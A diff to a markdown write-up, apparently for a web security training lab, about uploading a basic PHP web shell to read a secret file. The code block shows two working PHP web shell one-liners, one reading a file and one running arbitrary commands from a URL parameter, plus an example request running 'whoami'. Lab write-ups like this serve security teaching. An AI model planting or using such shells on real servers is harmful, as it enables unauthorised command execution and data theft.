@@ -7,11 +7,15 @@ To solve the lab, upload a basic PHP web shell and use it to exfiltrate the cont
 You can log in to your own account using the following credentials: `wiener:peter`
 # Solution
 ## Analysis
-PHP basic one-liners:
+### PHP basic one-liners
 ```php
 <?php echo file_get_contents('/path/to/target/file'); ?>
+
 <?php echo system($_GET['command']); ?>
+GET /example/exploit.php?command=whoami HTTP/1.1
 ```
+
+### Upload request example
 |![](Images/image.png)|
 |:--:| 
 | *Test* |
@@ -21,7 +25,7 @@ PHP basic one-liners:
 |:--:| 
 | *PHP code* |
 |![](Images/image-2.png)|
-| *PHP code upload* |
+| *PHP payload code upload* |
 |![](Images/image-3.png)|
 | *Path to uploaded file* |
 |![](Images/image-4.png)|
